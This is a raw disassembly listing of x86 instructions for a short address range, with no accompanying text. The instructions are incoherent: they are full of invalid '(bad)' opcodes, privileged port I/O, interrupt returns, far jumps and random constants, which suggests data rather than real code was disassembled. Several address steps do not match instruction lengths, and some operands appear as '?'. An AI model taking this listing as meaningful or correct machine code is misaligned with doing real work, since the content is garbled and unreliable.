  42026d:	adc    dh,BYTE PTR [esi+eax*8+0x5dd6dfe0]
  420274:	jl     0x420223
  420276:	dec    esi
  420277:	daa    
  420278:	sbb    ah,BYTE PTR [esp+esi*4-0x7b]
  42027c:	mov    ebx,0x2c90ccf4
  420281:	mov    ebx,0x7209a03e
  420286:	pop    edx
  420287:	out    0xc6,eax
  420289:	iret   
  42028a:	dec    esi
  42028b:	aaa    
  42028c:	adc    esi,esp
  42028e:	push   DWORD PTR [ecx+0x360cd5f9]
  420294:	icebp  
  420295:	xlat   BYTE PTR ds:[ebx]
  420296:	mov    ds:0x44564ed9,eax
  42029b:	(bad)  
  42029c:	xchg   ebp,eax
  42029d:	mov    BYTE PTR [edx-0x69],ch
  4202a0:	test   BYTE PTR [edx+eiz*4-0x7d9c4ea1],ch
  4202a7:	(bad)  [edx+0xf]
  4202aa:	mov    eax,DWORD PTR ds:0x4bc2a122
  4202b0:	push   0x64
  4202b2:	imul   ebp,DWORD PTR [esi],0xffffff80
  4202b5:	jecxz  0x420302
  4202b7:	mov    ecx,0xcc76fb00
  4202bc:	pusha  
  4202bd:	popa   
  4202be:	imul   eax,DWORD PTR [edi],0x122d21de
  4202c4:	mov    WORD PTR [ebp+0x4a9cd1c4],gs
  4202ca:	sahf   
  4202cb:	(bad)  
  4202cd:	test   ebp,ebx
  4202cf:	pusha  
  4202d0:	mov    esi,0x691aea19
  4202d5:	mov    ah,0xe
  4202d7:	sub    DWORD PTR [ebp-0x35cae3d0],esi
  4202dd:	cmc    
  4202de:	xchg   ebp,eax
  4202df:	iret   
  4202e0:	adc    ecx,eax
  4202e2:	in     eax,0xa1
  4202e4:	frstor [eax+0x25]
  4202e7:	je     0x420285
  4202e9:	lods   eax,DWORD PTR ds:[esi]
  4202ea:	cs sbb ecx,esp
  4202ed:	jp     0x42029c
  4202ef:	loope  0x42033d
  4202f1:	pop    eax
  4202f2:	aaa    
  4202f3:	sub    DWORD PTR [esi+0x44],edx
  4202f6:	fdiv   QWORD PTR cs:[esi]
  4202f9:	in     al,0xe2
  4202fb:	jae    0x4202af
  4202fd:	xor    BYTE PTR [ecx+0x15],bl
  420300:	sbb    dl,BYTE PTR [ecx]
  420302:	adc    al,0x58
  420304:	adc    ebx,DWORD PTR [edi-0x50]
  420307:	mov    esi,0x735791df
  42030c:	jb     0x42037c
  42030e:	pop    ebx
  42030f:	outs   dx,DWORD PTR ds:[esi]
  420310:	pop    es
  420311:	shr    BYTE PTR [edi+edx*4-0x2c],0xcc
  420316:	mul    BYTE PTR ss:[eax+edi*4+0x22]
  42031b:	loop   0x4202d5
  42031d:	sub    eax,0xfdc7701d
  420322:	lods   al,BYTE PTR ds:[esi]
  420323:	or     DWORD PTR [edx],edi
  420325:	jnp    0x4202f5
  420327:	cli    
  420328:	push   0x6d
  42032a:	mov    ah,0xe6
  42032c:	scas   al,BYTE PTR es:[edi]
  42032d:	xor    BYTE PTR [ecx-0x39e20772],cl
  420333:	push   ss
  420334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420335:	jmp    0x420377
  420337:	es add al,0xca
  42033a:	repnz mov es:0x7a76c51,al
  420341:	push   edx
  420342:	inc    edx
  420343:	cbw    
  420345:	sub    DWORD PTR [edx],ebp
  420347:	test   edx,0x549b7d4
  42034d:	mov    cs,edi
  42034f:	dec    ecx
  420350:	or     ah,0xe
  420353:	rep outs dx,BYTE PTR ds:[esi]
  420355:	stc    
  420356:	(bad)  
  420357:	xchg   ecx,eax
  420358:	push   cs
  420359:	or     esp,DWORD PTR [esi]
  42035b:	pop    ss
  42035c:	jae    0x4203c9
  42035e:	lahf   
  42035f:	xchg   edx,eax
  420360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420361:	enter  0x88cc,0x97
  420365:	aaa    
  420366:	ins    DWORD PTR es:[edi],dx
  420367:	or     al,0x6b
  420369:	or     esp,esp
  42036b:	add    eax,0x788ed7cd
  420370:	test   bh,dh
  420372:	cmp    esp,ebx
  420374:	push   es
  420375:	or     dl,BYTE PTR [ebp-0x80]
  420378:	pop    es
  420379:	sbb    eax,0x92ef0189
  42037e:	imul   ecx,DWORD PTR [ebp+0x64],0xfcdefce5
  420385:	out    0xf7,al
  420387:	ds jne 0x4203ce
  42038a:	outs   dx,DWORD PTR ds:[esi]
  42038b:	sub    eax,0xd85057f5
  420390:	pop    ecx
  420391:	pop    eax
  420392:	push   ecx
  420393:	xor    ecx,0x3ca7c2a9
  420399:	and    DWORD PTR [esp+edx*1-0x11],ebx
  42039d:	shr    BYTE PTR [edx-0x13378a6f],1
  4203a3:	lods   al,BYTE PTR ds:[esi]
  4203a4:	retf   
  4203a5:	outs   dx,DWORD PTR ds:[esi]
  4203a6:	inc    ecx
  4203a7:	sub    eax,0xe19e94bb
  4203ac:	stos   BYTE PTR es:[edi],al
  4203ad:	mov    esi,0x98c17fc8
  4203b2:	lea    eax,[esi]
  4203b4:	std    
  4203b5:	jne    0x4203da
  4203b7:	pop    edx
  4203b8:	and    eax,0xc63c1295
  4203bd:	scas   al,BYTE PTR es:[edi]
  4203be:	lds    ecx,FWORD PTR [eax+0x563f757e]
  4203c4:	mov    WORD PTR [edi],?
  4203c6:	mov    bh,BYTE PTR [edi-0x6e]
  4203c9:	in     eax,dx
  4203ca:	ins    BYTE PTR es:[edi],dx
  4203cb:	dec    esi
  4203cc:	cdq    
  4203cd:	or     DWORD PTR [esi],esp
  4203cf:	je     0x4203d0
  4203d1:	popf   
  4203d2:	push   0x71619bd5
  4203d7:	cld    
  4203d8:	inc    esp
  4203d9:	mov    ebx,0x668fc61b
  4203de:	mov    BYTE PTR [esi+0x29],ch
  4203e1:	adc    dl,BYTE PTR [ecx+ecx*1]
  4203e4:	retf   
  4203e5:	dec    ecx
  4203e6:	push   cs
  4203e7:	cmp    eax,0x8de1bb3a
  4203ec:	xor    ebx,0xffffffce
  4203ef:	sar    DWORD PTR [edx-0x22],0x87
  4203f3:	stc    
  4203f4:	(bad)  
  4203f5:	repnz (bad) 
  4203f7:	pop    eax
  4203f8:	sub    eax,0x8592086e
  4203fd:	popf   
  4203fe:	dec    ebx
  4203ff:	adc    BYTE PTR [edi+0x31],0x6c
  420403:	nop
  420404:	jl     0x4203a7
  420406:	sbb    bh,dl
  420408:	lock push esp
  42040a:	aam    0xf9
  42040c:	jnp    0x4203e9
  42040e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42040f:	data16 es loope 0x4203b4
  420413:	lods   al,BYTE PTR ds:[esi]
  420414:	in     eax,0xb
  420416:	dec    ebp
  420417:	aaa    
  420418:	(bad)  
  420419:	(bad)  
  42041b:	add    al,0xd0
  42041d:	mov    dl,BYTE PTR [edi+0x1]
  420420:	pop    esp
  420421:	jp     0x4203d7
  420423:	jl     0x420455
  420425:	rol    DWORD PTR [edi+0x58],cl
  420428:	push   cs
  420429:	imul   esi,DWORD PTR [edx+0x3c],0x70
  42042d:	and    ecx,DWORD PTR [edi]
  42042f:	je     0x4203e5
  420431:	and    DWORD PTR [edx+0x4f],esp
  420434:	or     al,0x44
  420436:	in     al,0xd0
  420438:	not    BYTE PTR [eax]
  42043a:	pop    edx
  42043b:	daa    
  42043c:	ficomp WORD PTR [ecx]
  42043e:	jne    0x4204aa
  420440:	mov    bh,0xcd
  420442:	and    al,ah
  420444:	pop    edx
  420445:	imul   ecx,DWORD PTR [edx-0x24],0xa
  420449:	dec    edx
  42044a:	mov    dl,0x5c
  42044c:	shl    BYTE PTR [edx+edx*2+0x21473988],1
  420453:	ret    
  420454:	push   cs
  420455:	dec    eax
  420456:	lods   eax,DWORD PTR ds:[esi]
  420457:	jmp    0x2140:0x81d6a732
  42045e:	aaa    
  42045f:	test   BYTE PTR [esi-0x26c6c064],dh
  420465:	int    0xd
  420467:	gs jb  0x420494
  42046a:	push   0x19
  42046c:	mov    ch,0xcb
  42046e:	push   ecx
  42046f:	inc    ebp
  420470:	mov    ah,0x1f
  420472:	cld    
  420473:	iret   
  420474:	fs ja  0x420448
  420477:	pop    edi
  420478:	in     eax,dx
  420479:	lahf   
  42047a:	mov    ds:0x408abbfc,al
  42047f:	aas    
  420480:	fcomp  QWORD PTR [esi+0x5c]
  420483:	int    0x8b
  420485:	mov    BYTE PTR [ecx-0x11450d06],ah
  42048b:	push   edx
  42048c:	mov    ebx,0xc17a2eff
  420491:	call   DWORD PTR ds:0x4cda5313
  420497:	mov    al,ds:0x8c3e916f
  42049c:	sbb    ebx,ebx
  42049e:	fidivr DWORD PTR [edx-0x4a]
  4204a1:	iret   
  4204a2:	push   edi
  4204a3:	xchg   DWORD PTR [ecx+0x29],ecx
  4204a6:	pop    ebp
  4204a7:	fnstsw WORD PTR [edx+0x31cc4af3]
  4204ad:	jbe    0x420494
  4204af:	sub    cl,BYTE PTR [eax-0x6e]
  4204b2:	mov    edi,0x810fb2e9
  4204b7:	and    edx,esi
  4204b9:	cmc    
  4204ba:	lods   eax,DWORD PTR ds:[esi]
  4204bb:	pop    edi
  4204bc:	es mov edi,0xc150cd6f
  4204c2:	cmc    
  4204c3:	adc    eax,0x46cc5f4e
  4204c8:	cmp    BYTE PTR [eax+0x45d2e0df],dl
  4204ce:	cld    
  4204cf:	cmp    DWORD PTR [esi-0x256474b],ebx
  4204d5:	fisub  DWORD PTR [edi+ecx*1]
  4204d8:	gs xchg ebp,eax
  4204da:	jg     0x6582ce33
  4204e0:	shl    BYTE PTR [edi+0x681371e1],1
  4204e6:	pop    ecx
  4204e7:	and    BYTE PTR [edx],0x49
  4204ea:	sti    
  4204eb:	or     eax,0xe08e77aa
  4204f0:	in     al,0x84
  4204f2:	repnz loope 0x4204e8
  4204f5:	add    al,0xb6
  4204f7:	in     eax,dx
  4204f8:	sbb    esi,DWORD PTR [eax+esi*1-0x2b]
  4204fc:	push   ecx
  4204fd:	dec    ecx
  4204fe:	sub    al,0x20
  420500:	das    
  420501:	push   esi
  420502:	das    
  420503:	sub    ebp,0x809a1bd5
  420509:	in     ax,0x21
  42050c:	mov    eax,ecx
  42050e:	inc    esi
  42050f:	jnp    0x4204dd
  420511:	jmp    0x420529
  420513:	scas   eax,DWORD PTR es:[edi]
  420514:	cmp    al,BYTE PTR [ebx]
  420516:	jp     0x420569
  420518:	dec    ecx
  420519:	cld    
  42051a:	xchg   ecx,eax
  42051b:	aam    0xaa
  42051d:	inc    edi
  42051e:	pop    ebp
  42051f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420520:	sbb    ah,BYTE PTR [edi-0x51]
  420523:	xchg   ebp,eax
  420524:	push   ecx
  420525:	sahf   
  420526:	sbb    dh,BYTE PTR [ebx]
  420528:	sub    al,0x6c
  42052a:	push   ebx
  42052b:	rcr    bh,1
  42052d:	lods   eax,DWORD PTR ds:[si]
  42052f:	retf   0x3bc9
  420532:	(bad)  
  420533:	jns    0x42059c
  420535:	pop    ecx
  420536:	add    al,0x67
  420538:	push   esp
  420539:	aad    0xca
  42053b:	pop    edx
  42053c:	dec    edx
  42053d:	lods   eax,DWORD PTR ds:[esi]
  42053e:	(bad)
  420541:	gs popf 
  420543:	hlt    
  420544:	stos   DWORD PTR es:[edi],eax
  420545:	fnsave [eax]
  420547:	and    eax,0xba25f82
  42054c:	imul   ebp,DWORD PTR [edi-0xf],0xffffffca
  420550:	retf   
  420551:	mov    edi,0x45f5882f
  420556:	retf   0x545c
  420559:	sub    al,BYTE PTR [ecx-0x5144b8d2]
  42055f:	adc    al,BYTE PTR [esi+0x64592f6e]
  420565:	and    al,0x33
  420567:	iret   
  420568:	fadd   QWORD PTR [ebp+0x1b62c627]
  42056e:	inc    edi
  42056f:	ret    0x392d
  420572:	jmp    0x42053b
  420574:	std    
  420575:	or     eax,0x65685943
  42057a:	rol    ebp,cl
  42057c:	sti    
  42057d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42057e:	sub    ebx,DWORD PTR [eax-0x56]
  420581:	add    BYTE PTR ds:0xdcff2836,cl
  420587:	xor    eax,edi
  420589:	jnp    0x42056c
  42058b:	inc    ebp
  42058c:	loope  0x420530
  42058e:	int    0x1d
  420590:	addr16 int3 
  420592:	es std 
  420594:	mov    edx,0x4883916
  420599:	mov    al,0xdc
  42059b:	add    al,0x37
  42059d:	jge    0x42056c
  42059f:	adc    cl,ah
  4205a1:	jbe    0x420608
  4205a3:	sbb    dl,BYTE PTR [ebp+0x7449ea44]
  4205a9:	push   edx
  4205aa:	fincstp 
  4205ac:	pop    edx
  4205ad:	rcr    BYTE PTR [edi-0x12fad5c7],1
  4205b3:	leave  
  4205b4:	inc    BYTE PTR [ecx-0x937cf5e]
  4205ba:	in     eax,dx
  4205bb:	sbb    BYTE PTR [edi+0x6eda4123],ah
  4205c1:	jecxz  0x42060f
  4205c3:	xor    ah,BYTE PTR [esi+eiz*4+0x15]
  4205c7:	retf   
  4205c8:	push   0x6bcd62b7
  4205cd:	mov    cl,0x1
  4205cf:	add    al,0xd2
  4205d1:	jae    0x420614
  4205d3:	fld    QWORD PTR ds:0x6457dc71
  4205d9:	or     DWORD PTR [edx],edx
  4205db:	inc    edx
  4205dc:	daa    
  4205dd:	sbb    eax,0x7e192ccb
  4205e2:	rol    DWORD PTR [eax],cl
  4205e4:	mov    DWORD PTR [ecx],eax
  4205e6:	add    al,0x80
  4205e8:	mov    DWORD PTR [esi],edx
  4205ea:	xchg   ebp,eax
  4205eb:	sub    al,0x34
  4205ed:	adc    eax,0x2ec3e53f
  4205f2:	outs   dx,BYTE PTR ds:[esi]
  4205f3:	jecxz  0x4205f4
  4205f5:	ss mov ecx,0x9ad6061a
  4205fb:	sbb    al,BYTE PTR [esi-0xd71ec16]
  420601:	icebp  
  420602:	shl    BYTE PTR [edi],cl
  420604:	jl     0x420608
  420606:	add    cl,BYTE PTR [ebx]
  420608:	stos   DWORD PTR es:[edi],eax
  420609:	mov    DWORD PTR fs:[ecx+0xc231711],ebp
  420610:	fcmovne st,st(4)
  420612:	and    BYTE PTR [esi],bl
  420614:	leave  
  420615:	retf   
  420616:	and    dh,dh
  420618:	pop    ebx
  420619:	fistp  DWORD PTR [edx+0x2c]
  42061c:	xlat   BYTE PTR ds:[ebx]
  42061d:	loope  0x42066c
  42061f:	add    eax,0xbdbf6d23
  420624:	(bad)  
  420625:	cld    
  420626:	ret    
  420627:	pushf  
  420628:	fimul  WORD PTR [edx+0x75e4f4e9]
  42062e:	add    eax,DWORD PTR [edi+edi*8]
  420631:	inc    ecx
  420632:	mov    ebx,DWORD PTR [esi]
  420634:	and    ch,BYTE PTR [esi+0x4c]
  420637:	sub    DWORD PTR [eax+0x24],edx
  42063a:	or     bh,BYTE PTR [edi+0x2a47187c]
  420640:	popf   
  420641:	sti    
  420642:	cmp    dl,ch
  420644:	mov    ds:0xcb9cc891,al
  420649:	dec    esp
  42064a:	popa   
  42064b:	sti    
  42064c:	push   es
  42064d:	mov    ebp,0x12c570fa
  420652:	sbb    BYTE PTR [esi+0x3f316e9f],ch
  420658:	add    ebx,DWORD PTR [ecx]
  42065a:	les    ebx,FWORD PTR [esp+eiz*4]
  42065d:	cmp    dh,ah
  42065f:	das    
  420660:	xor    BYTE PTR cs:[edi-0x3],bh
  420664:	and    ebp,DWORD PTR [ebx+0x21ac90d7]
  42066a:	xor    edi,ecx
  42066c:	mov    ebx,0x4d5f6fbe
  420671:	test   bh,bh
  420673:	sbb    eax,0xafce380f
  420678:	(bad)  
  420679:	(bad)  
  42067a:	push   ebp
  42067b:	inc    ecx
  42067c:	jbe    0x42066d
  42067e:	loopne 0x4206cc
  420680:	mov    ch,0xea
  420682:	xchg   ebx,eax
  420683:	in     eax,0x2f
  420685:	mov    esp,DWORD PTR [edx]
  420687:	jnp    0x420628
  420689:	and    DWORD PTR [edx],esi
  42068b:	fld    TBYTE PTR ds:0xf5b68b2e
  420691:	inc    edx
  420692:	js     0x4206c8
  420694:	push   0x531c31f9
  420699:	adc    eax,DWORD PTR [esi+0x5d]
  42069c:	and    al,0x80
  42069e:	test   BYTE PTR [eax+0x43],dl
  4206a1:	cli    
  4206a2:	in     al,0x74
  4206a4:	fdivp  st(4),st
  4206a6:	and    eax,0x20c51191
  4206ab:	scas   eax,DWORD PTR es:[edi]
  4206ac:	xchg   BYTE PTR [edx],dl
  4206ae:	xor    al,0xf1
  4206b0:	hlt    
  4206b1:	add    eax,DWORD PTR [ebx]
  4206b3:	xchg   ebp,eax
  4206b4:	scas   al,BYTE PTR es:[edi]
  4206b5:	ins    DWORD PTR es:[edi],dx
  4206b6:	int3   
  4206b7:	ja     0x4206a5
  4206b9:	xor    eax,DWORD PTR ds:0x6bbcded
  4206bf:	mov    esi,0x20bd567
  4206c4:	sub    esp,esp
  4206c6:	pop    ds
  4206c7:	fwait
  4206c8:	jge    0x420694
  4206ca:	adc    eax,0x72e29d1c
  4206cf:	pop    es
  4206d0:	or     ebp,DWORD PTR [eax+edi*4-0x63b198bb]
  4206d7:	mov    edx,0x5bb767d9
  4206dc:	or     eax,0xed9f1f8a
  4206e1:	push   es
  4206e2:	pop    ebp
  4206e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206e4:	(bad)  
  4206e5:	jne    0x420690
  4206e7:	xor    al,0xad
  4206e9:	mov    ecx,0xab134688
  4206ee:	and    al,0x85
  4206f0:	mov    WORD PTR [esi+0x3b1b1517],fs
  4206f6:	adc    esp,DWORD PTR [edx-0x73]
  4206f9:	xor    BYTE PTR [esi],dh
  4206fb:	jne    0x420745
  4206fd:	and    al,0xa3
  4206ff:	mov    DWORD PTR [esi-0x5c0ee2a8],ebp
  420705:	loope  0x4206bf
  420707:	stos   DWORD PTR es:[edi],eax
  420708:	arpl   WORD PTR [ebx-0x8de010b],ax
  42070e:	sbb    eax,0xb1e6eb0
  420713:	mov    cl,0xd5
  420715:	ins    DWORD PTR es:[edi],dx
  420716:	mov    ecx,0xcd9eda01
  42071b:	mov    ebx,esi
  42071d:	sti    
  42071e:	mov    bl,0xb2
  420720:	sbb    al,0x54
  420722:	out    0x52,al
  420724:	ins    DWORD PTR es:[edi],dx
  420725:	scas   al,BYTE PTR es:[edi]
  420726:	cmp    bh,dl
  420728:	mov    ds:0x60978f79,al
  42072d:	add    bh,BYTE PTR [edi+0x8]
  420730:	outs   dx,DWORD PTR ds:[esi]
  420731:	cmc    
  420732:	pop    edx
  420733:	xor    al,0xa3
  420735:	out    0x1b,al
  420737:	(bad)  
  420738:	std    
  420739:	jne    0x4206e9
  42073b:	push   esi
  42073c:	inc    eax
  42073d:	mov    ecx,0x14c567d8
  420742:	pusha  
  420743:	in     eax,dx
  420744:	adc    bh,BYTE PTR [edi-0x1]
  420747:	outs   dx,BYTE PTR ds:[esi]
  420748:	or     bh,ah
  42074a:	popa   
  42074b:	or     DWORD PTR [ebx],esi
  42074d:	mov    ebp,0x87d5b250
  420752:	lahf   
  420753:	push   esp
  420754:	stc    
  420755:	mov    cl,0x2e
  420757:	popa   
  420758:	jmp    0xe1a82763
  42075d:	xchg   esp,eax
  42075e:	add    esp,DWORD PTR [edi-0x76]
  420761:	int    0x8
  420763:	xchg   esi,eax
  420764:	xor    al,BYTE PTR [eax-0x5531b915]
  42076a:	imul   ebp,DWORD PTR [ebx+ecx*1],0x2c825b89
  420771:	aas    
  420772:	push   es
  420773:	inc    ebp
  420774:	cld    
  420775:	loopne 0x4207d7
  420777:	xchg   BYTE PTR [ebx+0x6a1cad37],cl
  42077d:	mov    dl,BYTE PTR [ecx+0x5dae5d80]
  420783:	test   al,0x25
  420785:	popa   
  420786:	and    BYTE PTR [ebp-0x77],al
  420789:	pushf  
  42078a:	mov    eax,0x7a535aa
  42078f:	dec    BYTE PTR ds:0x975f9d4f
  420795:	(bad)  
  420796:	aaa    
  420797:	push   ebx
  420798:	in     eax,dx
  420799:	mov    ebx,0xda6037e4
  42079e:	lahf   
  42079f:	xchg   ebx,eax
  4207a0:	outs   dx,BYTE PTR ds:[esi]
  4207a1:	cmc    
  4207a2:	xor    BYTE PTR [edi+0x49],ah
  4207a5:	mov    edi,DWORD PTR [esi+0x59]
  4207a8:	dec    ebx
  4207aa:	push   cs
  4207ab:	inc    ebx
  4207ac:	mov    esp,0xded5ed76
  4207b1:	sahf   
  4207b2:	xchg   edx,eax
  4207b4:	out    0x20,eax
  4207b6:	mov    ch,0xfb
  4207b8:	pop    ds
  4207b9:	int    0xfe
  4207bb:	pop    ebx
  4207bc:	fadd   QWORD PTR [ebx]
  4207be:	ds inc ax
  4207c1:	cmp    eax,0xee279b92
  4207c6:	sbb    eax,0xf3b2cc8f
  4207cb:	mov    edx,0x15d85738
  4207d0:	mov    ds:0xba823604,eax
  4207d5:	test   edi,esp
  4207d7:	jnp    0x4207b7
  4207d9:	inc    esp
  4207da:	jns    0x420796
  4207dc:	push   cs
  4207dd:	push   esp
  4207de:	bound  edx,QWORD PTR [ebx-0x24]
  4207e1:	xchg   esi,eax
  4207e2:	add    ebp,DWORD PTR [eax-0x76]
  4207e5:	jecxz  0x420823
  4207e7:	ret    0x66f5
  4207ea:	lahf   
  4207eb:	shl    DWORD PTR [ebx-0x7c7f2e65],cl
  4207f1:	mov    bl,0xee
  4207f3:	mov    edi,0xd88f19ab
  4207f8:	mov    edi,0x615497c5
  4207fd:	push   ds
  4207fe:	mov    bl,0x6f
  420800:	cmp    eax,0x3157eaf4
  420805:	jmp    0xbc3dc48b
  42080a:	mov    edx,0x965e75a2
  42080f:	call   0x4988:0x4237ba11
  420816:	adc    DWORD PTR [ecx+0x34],esp
  420819:	sbb    eax,0xcf5e4d15
  42081e:	out    0xc9,al
  420820:	out    dx,al
  420821:	in     al,dx
  420822:	pop    esp
  420823:	jno    0x4207ae
  420825:	aam    0xc
  420827:	(bad)  
  420828:	push   edi
  420829:	mov    esp,DWORD PTR [ebx-0x27]
  42082c:	sti    
  42082d:	(bad)  
  42082e:	call   0xb35cd9af
  420833:	pop    esi
  420834:	jl     0x4208b1
  420836:	rol    eax,cl
  420838:	icebp  
  420839:	xor    eax,DWORD PTR [edx]
  42083b:	dec    eax
  42083c:	cmp    eax,0xc666afcf
  420841:	sbb    eax,0x49290d7
  420846:	or     DWORD PTR [eax+eax*1-0x4bcfc531],0x10
  42084e:	paddusb mm4,QWORD PTR ss:[ebx+0x336b4703]
  420856:	leave  
  420857:	pop    esp
  420858:	or     DWORD PTR [esi-0x6a],0xffffffb2
  42085c:	xchg   ebx,eax
  42085d:	xchg   DWORD PTR [ecx-0x4aeaca2d],eax
  420863:	sub    BYTE PTR [esi-0x66f578e6],ch
  420869:	(bad)  
  42086a:	dec    esi
  42086b:	lods   al,BYTE PTR ds:[esi]
  42086c:	push   es
  42086d:	je     0x420897
  42086f:	mov    dl,0xe
  420871:	or     bl,BYTE PTR [esi-0xb7eb746]
  420877:	inc    BYTE PTR [esi+0x1898e05a]
  42087d:	faddp  st(7),st
  42087f:	sbb    al,0xc8
  420881:	inc    ecx
  420882:	or     dl,BYTE PTR [esi]
  420884:	mov    edi,esp
  420886:	cmc    
  420887:	push   0xc1741042
  42088c:	xchg   edx,eax
  42088d:	adc    al,0xc8
  42088f:	nop
  420890:	add    al,0x27
  420893:	xor    eax,DWORD PTR [edx-0x6fa8048c]
  420899:	cmp    al,0xbe
  42089b:	aaa    
  42089c:	push   eax
  42089d:	jne    0x42088a
  42089f:	jp     0x4208d1
  4208a1:	retf   0x527e
  4208a4:	mov    WORD PTR [ebx],?
  4208a6:	jmp    0x56a0:0xf29b1e32
  4208ad:	lods   eax,DWORD PTR ds:[esi]
  4208ae:	and    eax,0x638a182a
  4208b3:	(bad)  
  4208b4:	jbe    0x420867
  4208b6:	push   ebx
  4208b7:	sti    
  4208b8:	or     BYTE PTR [ecx-0x44],dh
  4208bb:	jmp    0x4208c5
  4208bd:	cmp    esp,DWORD PTR [eax]
  4208bf:	ins    DWORD PTR es:[edi],dx
  4208c0:	repnz out dx,al
  4208c2:	sub    ebp,esp
  4208c4:	mov    esp,ecx
  4208c6:	out    0x3c,eax
  4208c8:	mov    bh,ah
  4208ca:	adc    eax,0xc57f55f0
  4208cf:	fstp   TBYTE PTR [ecx+0x20]
  4208d2:	jmp    0x4208ab
  4208d4:	jne    0x420902
  4208d6:	xchg   ch,bl
  4208d8:	lock cmp ecx,DWORD PTR ds:0x3bcd0b7e
  4208df:	daa    
  4208e0:	iret   
  4208e1:	pop    esi
  4208e2:	ins    DWORD PTR es:[edi],dx
  4208e3:	(bad)  
  4208e4:	ja     0x420885
  4208e6:	sahf   
  4208e7:	repnz sbb esp,DWORD PTR [esi-0x33]
  4208eb:	int3   
  4208ec:	add    ebp,DWORD PTR [esi+0x1477f771]
  4208f2:	icebp  
  4208f3:	stos   BYTE PTR es:[edi],al
  4208f4:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4208f6:	or     dl,BYTE PTR [edx-0x342dcf53]
  4208fc:	fdivr  DWORD PTR [ebx+0x7838a705]
  420902:	addr16 sahf 
  420904:	pushf  
  420905:	aas    
  420906:	mov    eax,ds:0xae568300
  42090b:	cld    
  42090c:	or     dl,bl
  42090e:	and    eax,0x7a43fe66
  420913:	je     0x4208f0
  420915:	mov    cl,0x6a
  420917:	sahf   
  420918:	dec    eax
  420919:	push   ss
  42091a:	mov    esi,0x926535a4
  420920:	loop   0x4208af
  420922:	jmp    0x8909e323
  420927:	mov    eax,0x76c604ad
  42092c:	xor    DWORD PTR [ebx-0x7c43745f],esi
  420932:	push   ds
  420933:	pop    es
  420934:	mov    eax,ds:0x62e83c2f
  420939:	xchg   ecx,eax
  42093a:	and    DWORD PTR [edx-0x1b910b55],ebp
  420940:	push   es
  420941:	mov    ds:0x2a526765,al
  420946:	jne    0x420915
  420948:	loopne 0x4209ad
  42094a:	mov    bl,BYTE PTR [ecx]
  42094c:	jp     0x4209ad
  42094e:	or     eax,0xe8996ae9
  420953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420954:	stos   BYTE PTR es:[edi],al
  420955:	push   eax
  420956:	mov    esp,0x2d4ec12d
  42095b:	xchg   ebx,eax
  42095c:	jae    0x42097f
  42095e:	pop    ebx
  420960:	jns    0x4209af
  420962:	mov    bl,BYTE PTR [ecx+ebx*8-0x20c77726]
  420969:	jle    0x420914
  42096b:	loopne 0x420932
  42096d:	inc    esi
  42096e:	adc    al,0x5c
  420970:	repnz les edi,FWORD PTR [ebp-0x63]
  420974:	test   BYTE PTR [edx-0x4],al
  420977:	mov    al,ds:0xbeebc988
  42097c:	lea    eax,[ebx-0x20fae7b7]
  420982:	cli    
  420983:	add    BYTE PTR ss:[edx],bh
  420986:	mov    eax,ds:0x8f67bfa4
  42098b:	jb     0x4209db
  42098d:	mov    eax,ds:0x277bc44b
  420992:	jbe    0x4209dd
  420994:	push   cs
  420995:	xchg   esp,eax
  420996:	mov    eax,ds:0x7c8977e
  42099b:	into   
  42099c:	repz fsubr DWORD PTR [ecx+0x5e169649]
  4209a3:	cmc    
  4209a4:	(bad)  
  4209a5:	pop    esp
  4209a6:	adc    al,bh
  4209a8:	add    BYTE PTR [edi+eax*8],dl
  4209ab:	jnp    0x420953
  4209ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ae:	cdq    
  4209af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209b0:	daa    
  4209b1:	aad    0xcd
  4209b3:	inc    ecx
  4209b4:	ins    DWORD PTR es:[edi],dx
  4209b5:	pop    ebx
  4209b6:	cmp    dl,cl
  4209b8:	aas    
  4209b9:	sahf   
  4209ba:	pop    ebx
  4209bb:	jl     0x420991
  4209bd:	pushf  
  4209be:	les    ecx,FWORD PTR [eax+0x45]
  4209c1:	lods   al,BYTE PTR ds:[esi]
  4209c2:	repnz push edx
  4209c4:	call   DWORD PTR [ebx-0x6e]
  4209c7:	sub    al,0x30
  4209c9:	add    al,0x3a
  4209cb:	xchg   edx,eax
  4209cc:	or     bl,BYTE PTR [edx-0x66]
  4209cf:	sbb    BYTE PTR [esi+0x2015d46e],dl
  4209d5:	ficomp WORD PTR [eax+0x372f94d1]
  4209db:	push   ebx
  4209dc:	sbb    DWORD PTR [esi+0x0],ebp
  4209df:	push   0x74
  4209e1:	hlt    
  4209e2:	pop    edx
  4209e3:	mov    eax,ds:0xdd307cf8
  4209e8:	and    ah,al
  4209ea:	and    cl,dh
  4209ec:	and    dh,BYTE PTR [ebp-0x3b406f62]
  4209f2:	in     al,dx
  4209f3:	loope  0x420a29
  4209f5:	jmp    DWORD PTR [ecx]
  4209f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209f8:	stos   BYTE PTR es:[edi],al
  4209f9:	imul   ebx,ecx,0x1a
  4209fc:	ret    0x3daf
  4209ff:	mov    al,ds:0x4b0498a2
  420a04:	pop    es
  420a05:	add    DWORD PTR [esi+eax*4],0xfffffffa
  420a09:	(bad)  
  420a0b:	mov    edi,0x33c5afe7
  420a10:	lds    esi,FWORD PTR [ebp+0x25]
  420a13:	xchg   BYTE PTR [edx-0x458e9f90],bl
  420a19:	pop    esp
  420a1a:	add    BYTE PTR [ecx],0x76
  420a1d:	add    DWORD PTR [ecx],ecx
  420a1f:	cdq    
  420a20:	pop    ebp
  420a22:	scas   eax,DWORD PTR es:[edi]
  420a23:	jle    0x420a33
  420a25:	retf   0x8b8a
  420a28:	test   DWORD PTR [esi-0x2d6b4a9],esi
  420a2e:	cmc    
  420a2f:	xlat   BYTE PTR ds:[ebx]
  420a30:	xor    BYTE PTR [esi+0x61],ch
  420a33:	mov    al,0x8d
  420a35:	dec    DWORD PTR [ecx+0x59e98e4]
  420a3b:	scas   eax,DWORD PTR es:[edi]
